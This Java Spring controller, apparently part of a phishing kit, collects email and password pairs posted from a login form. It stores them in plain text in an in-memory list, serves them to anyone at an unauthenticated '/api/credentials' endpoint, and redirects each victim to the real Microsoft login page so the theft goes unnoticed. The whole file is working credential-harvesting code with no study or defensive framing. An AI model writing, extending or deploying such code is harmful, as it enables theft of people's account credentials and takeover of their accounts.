package com.example.credentialcollection.controller;


import com.example.credentialcollection.model.Credentials;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.client.RestTemplate;

import java.net.URI;
import java.util.ArrayList;
import java.util.List;

@Controller
@RequestMapping("/api/")
public class CredentialController {


    @Autowired
    private RestTemplate restTemplate;


    List<Credentials> credentialsList = new ArrayList<>();


    @GetMapping("credentials")
    @ResponseBody
    public List<Credentials> credentialForm() {
        return credentialsList;
    }

    @PostMapping("submitForm")
    public ResponseEntity<Void> credentialSubmit(@RequestParam String email, String password) {

        Credentials credentials = new Credentials();
        credentials.setEmail(email);
        credentials.setPassword(password);
        credentialsList.add(credentials);

        return ResponseEntity.status(HttpStatus.FOUND).location(URI.create("https://login.microsoftonline.com/")).build();
    }

}